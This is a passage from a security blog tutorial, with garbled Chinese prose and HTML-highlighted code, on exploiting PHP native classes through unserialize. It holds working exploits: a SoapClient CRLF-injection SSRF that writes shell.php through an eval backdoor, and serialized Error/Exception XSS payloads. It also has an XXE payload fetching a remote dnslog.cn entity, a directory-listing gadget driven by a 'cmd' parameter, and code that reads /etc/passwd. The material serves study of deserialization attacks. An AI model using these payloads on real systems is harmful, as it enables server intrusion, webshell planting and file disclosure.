punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token string single-quoted-string">'__destruct'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__toString'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__wakeup'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__call'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__callStatic'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__get'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__set'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__isset'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__unset'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__invoke'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__set_state'</span>        <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">print</span> <span class="token variable">$class</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'::'</span> <span class="token operator">.</span> <span class="token variable">$method</span> <span class="token operator">.</span> <span class="token string double-quoted-string">";"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">print</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><h3 id="SoapClient-call"><a href="#SoapClient-call" class="headerlink" title="SoapClient::__call"></a>SoapClient::__call</h3><p>å¯è¿›è¡ŒSSRF</p><p><strong>range</strong>ï¼š<code>PHP 5, PHP 7, PHP 8</code></p><blockquote><p>SOAPï¼ˆç®€å•å¯¹è±¡è®¿é—®åè®®ï¼‰æ˜¯è¿æ¥æˆ–WebæœåŠ¡æˆ–å®¢æˆ·ç«¯å’ŒWebæœåŠ¡ä¹‹é—´çš„æ¥å£ã€‚</p><p>å…¶é‡‡ç”¨HTTPä½œä¸ºåº•å±‚é€šè®¯åè®®ï¼ŒXMLä½œä¸ºæ•°æ®ä¼ é€çš„æ ¼å¼ï¼Œä»…é™äºhttp/httpsåè®®</p><p>SOAPæ¶ˆæ¯åŸºæœ¬ä¸Šæ˜¯ä»å‘é€ç«¯åˆ°æ¥æ”¶ç«¯çš„å•å‘ä¼ è¾“ï¼Œä½†å®ƒä»¬å¸¸å¸¸ç»“åˆèµ·æ¥æ‰§è¡Œç±»ä¼¼äºè¯·æ±‚ / åº”ç­”çš„æ¨¡å¼ã€‚</p><p>å¦‚æœæƒ³è¦ä½¿ç”¨SoapClientç±»éœ€è¦åœ¨php.inié…ç½®æ–‡ä»¶é‡Œé¢å¼€å¯extension=php_soap.dllé€‰é¡¹</p></blockquote><pre class="language-php" data-language="php"><code class="language-php">SoapClient <span class="token punctuation">&#123;</span>    <span class="token comment">/* æ–¹æ³• */</span>    <span class="token keyword">public</span> <span class="token function">__construct</span> <span class="token punctuation">(</span> <span class="token keyword type-declaration">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$wsdl</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token function">__call</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$args</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">mixed</span>    <span class="token keyword">public</span> <span class="token function">__doRequest</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$request</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$location</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$action</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$version</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">bool</span> <span class="token variable">$oneWay</span> <span class="token operator">=</span> <span class="token constant boolean">false</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>    <span class="token keyword">public</span> <span class="token function">__getCookies</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">array</span>    <span class="token keyword">public</span> <span class="token function">__getFunctions</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">array</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>    <span class="token keyword">public</span> <span class="token function">__getLastRequest</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>    <span class="token keyword">public</span> <span class="token function">__getLastRequestHeaders</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>    <span class="token keyword">public</span> <span class="token function">__getLastResponse</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>    <span class="token keyword">public</span> <span class="token function">__getLastResponseHeaders</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>    <span class="token keyword">public</span> <span class="token function">__getTypes</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">array</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>    <span class="token keyword">public</span> <span class="token function">__setCookie</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">void</span>    <span class="token keyword">public</span> <span class="token function">__setLocation</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$location</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>    <span class="token keyword">public</span> <span class="token function">__setSoapHeaders</span> <span class="token punctuation">(</span> <span class="token class-name">SoapHeader</span><span class="token operator">|</span><span class="token keyword type-declaration">array</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$headers</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">__soapCall</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$args</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">array</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">,</span> <span class="token class-name">SoapHeader</span><span class="token operator">|</span><span class="token keyword type-declaration">array</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$inputHeaders</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">array</span> <span class="token operator">&amp;</span><span class="token variable">$outputHeaders</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">mixed</span><span class="token punctuation">&#125;</span></code></pre><p><strong>use</strong></p><ul><li><code>SoapClient::__construct ( string|null $wsdl , array $options = [] )</code><ul><li><code>$wsdl</code>ï¼šwsdlæ–‡ä»¶çš„uriï¼Œå¦‚æœæ˜¯NULLæ„å‘³ç€ä¸ä½¿ç”¨WSDLæ¨¡å¼ã€‚</li><li><code>$options</code>ï¼šå¦‚æœåœ¨wsdlæ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›å¦‚æœåœ¨éwsdlæ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½®locationå’Œurié€‰é¡¹ï¼Œå…¶ä¸­locationæ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„SOAPæœåŠ¡å™¨çš„URLï¼Œè€Œuri æ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚</li></ul></li><li><code>SoapClient::__call ( string $name , array $args ) : mixed</code></li></ul><p>å®˜æ–¹çš„<code>$option</code>å‚æ•°ä¸­æœ‰è¿™æ ·çš„ä¸€æ¡ä»‹ç»</p><pre class="language-none"><code class="language-none">The user_agent option specifies string to use in User-Agent header.</code></pre><p>æˆ‘ä»¬å¯ä»¥è‡ªå·±è®¾ç½®<code>User-Agent</code>çš„å€¼ã€‚å½“æˆ‘ä»¬å¯ä»¥æ§åˆ¶User-Agentçš„å€¼æ—¶ï¼Œä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬å®Œå…¨å¯ä»¥æ„é€ ä¸€ä¸ªPOSTè¯·æ±‚ï¼Œå› ä¸º<code>Content-Type</code>å’Œ<code>Content-Length</code>éƒ½åœ¨<code>User-Agent</code>ä¹‹ä¸‹ï¼Œè€Œæ§åˆ¶è¿™ä¸¤ä¸ªæ˜¯åˆ©ç”¨<code>CRLF</code>å‘é€POSTè¯·æ±‚æœ€å…³é”®çš„åœ°æ–¹ã€‚</p><p><strong>Demo</strong></p><p><a href="https://learnku.com/laravel/t/3905/do-you-really-know-ip-how-do-php-get-the-real-user-ip"><code>$_SERVER[&#39;REMOTE_ADDR&#39;]å‚è€ƒ</code></a></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    @<span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><strong>Exp</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$target</span><span class="token operator">=</span> <span class="token string single-quoted-string">'http://127.0.0.1/demo.php'</span><span class="token punctuation">;</span><span class="token variable">$post_string</span><span class="token operator">=</span> <span class="token string single-quoted-string">'1=file_put_contents("shell.php", "&lt;?php phpinfo();?>");'</span><span class="token punctuation">;</span><span class="token variable">$headers</span><span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>   <span class="token string single-quoted-string">'X-Forwarded-For:127.0.0.1'</span><span class="token punctuation">,</span>   <span class="token string single-quoted-string">'Cookie:admin=1'</span>   <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'location'</span><span class="token operator">=></span> <span class="token variable">$target</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'user_agent'</span><span class="token operator">=></span><span class="token string single-quoted-string">'wupco^^Content-Type:application/x-www-form-urlencoded^^'</span><span class="token operator">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'^^'</span><span class="token punctuation">,</span><span class="token variable">$headers</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'^^Content-Length:'</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post_string</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'^^^^'</span><span class="token operator">.</span><span class="token variable">$post_string</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'uri'</span><span class="token operator">=></span><span class="token string double-quoted-string">"xxx"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å› ä¸ºUser-agentæ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨crlfæ³¨å…¥httpå¤´éƒ¨å‘é€postè¯·æ±‚</span><span class="token variable">$aaa</span><span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span><span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'^^'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'%0d%0a'</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span><span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&amp;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'%26'</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$aaa</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è°ƒç”¨__callæ–¹æ³•è§¦å‘ç½‘ç»œè¯·æ±‚å‘é€</span><span class="token variable">$x</span><span class="token operator">-></span><span class="token function">no_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20210521214101395.png" alt loading="lazy"></p><p>æˆåŠŸå†™shell</p><h3 id="Error-Exception"><a href="#Error-Exception" class="headerlink" title="Error/Exception"></a>Error/Exception</h3><p>XSS</p><p><strong>range</strong>ï¼š<code>Error(php7, PHP8), Exception(php5, php7, PHP8)</code></p><p>é€šè¿‡å†…ç½®<code>__toString()</code>é­”æœ¯æ–¹æ³•è§¦å‘ã€‚</p><p><strong>Demo</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span></span></code></pre><p><strong>Error Class Exp</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script>alert(1)&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">#æ³¨æ„ç‰ˆæœ¬æ˜¯PHP7</span></span></code></pre><p><strong>Payload</strong></p><pre class="language-none"><code class="language-none">O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A52%3A%22D%3A%5CDesktopFolder%5CCode%5CPhpCode%5CPhpStorm%5Ctest%5Ctest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20210521215011423.png" alt loading="lazy"></p><p><strong>Exception Class Exp</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>ã€€ã€€<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script>alert(1)&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ã€€ã€€<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><strong>Payload</strong></p><pre class="language-none"><code class="language-none">O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A52%3A%22D%3A%5CDesktopFolder%5CCode%5CPhpCode%5CPhpStorm%5Ctest%5Ctest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20210521215327661.png" alt loading="lazy"></p><h3 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h3><p>XXE</p><p><strong>range</strong>ï¼š<code>(PHP 5, PHP 7, PHP 8)</code></p><p>åˆ©ç”¨å®ä¾‹åŒ–è¯¥ç±»çš„å¯¹è±¡æ¥ä¼ å…¥xmlä»£ç è¿›è¡Œxxeæ”»å‡»ï¼Œè¿›è€Œè¯»å–æ–‡ä»¶å†…å®¹å’Œå‘½ä»¤æ‰§è¡Œã€‚</p><p><strong>payload</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOF</span><span class="token operator">&lt;</span><span class="token operator">?</span>xml version<span class="token operator">=</span><span class="token string double-quoted-string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string double-quoted-string">"utf-8"</span> <span class="token delimiter important">?></span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span> <span class="token punctuation">[</span><span class="token internal-subset">    &lt;!ENTITY % remote SYSTEM "http://suhk4i.dnslog.cn">%remote;</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span>&amp;xee<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span>EOF;$xml_class = new SimpleXMLElement($xml, LIBXML_NOENT);var_dump($xml_class);?></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20210521220408864.png" alt loading="lazy"></p><h3 id="SPL-File-Class"><a href="#SPL-File-Class" class="headerlink" title="SPL File Class"></a>SPL File Class</h3><h4 id="å¯éå†ç›®å½•ç±»"><a href="#å¯éå†ç›®å½•ç±»" class="headerlink" title="å¯éå†ç›®å½•ç±»"></a>å¯éå†ç›®å½•ç±»</h4><p><strong>DirectoryIterator</strong></p><p><strong>range</strong>ï¼š<code>(PHP 5, PHP 7, PHP 8)</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// ä¸åŠ __toString()ä¹Ÿå¯,å› ä¸ºechoå¯ä»¥è‡ªåŠ¨è°ƒç”¨</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20210521224348452.png" alt loading="lazy"></p><p><strong>FilesystemIterator</strong></p><p><strong>range</strong>ï¼š<code>(PHP 5 &gt;= 5.3.0, PHP 7, PHP 8)</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilesystemIterator</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">#payload : cmd=glob:///*</span></span></code></pre><p><strong>GlobIterator</strong></p><p><strong>range</strong>ï¼š<code>(PHP 5 &gt;= 5.3.0, PHP 7, PHP 8)</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GlobIterator</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">#payload : cmd=glob:///*</span></span></code></pre><h4 id="å¯è¯»å–æ–‡ä»¶ç±»"><a href="#å¯è¯»å–æ–‡ä»¶ç±»" class="headerlink" title="å¯è¯»å–æ–‡ä»¶ç±»"></a>å¯è¯»å–æ–‡ä»¶ç±»</h4><p><strong>SplFileObject</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$context</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SplFileObject</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$context</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20210521225031747.png" alt loading="lazy"></p><h3 id="ZipArchive-open"><a href="#ZipArchive-open" class="headerlink" title="ZipArchive::open()"></a>ZipArchive::open()</h3><p>å¯è¿›è¡Œæ–‡ä»¶åˆ é™¤æ“ä½œ</p><p><strong>range</strong>ï¼š<code>PHP 5 &gt;= 5.2.0, PHP 7, PHP 8, PECL zip &gt;= 1.1.0</code></p><pre class="language-php" data-language="php"><code class="language-php">ZipArchive <span class="token punctuation">&#123;</span>    <span class="token comment">/* æ–¹æ³• */</span>    <span class="token keyword">public</span> <span class="token function">addEmptyDir</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$dirname</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">addFile</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$filepath</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$entryname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token class-name static-context">ZipArchive</span><span class="token operator">::</span><span class="token constant">FL_OVERWRITE</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">addFromString</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$content</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token class-name static-context">ZipArchive</span><span class="token operator">::</span><span class="token constant">FL_OVERWRITE</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">addGlob</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$pattern</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token 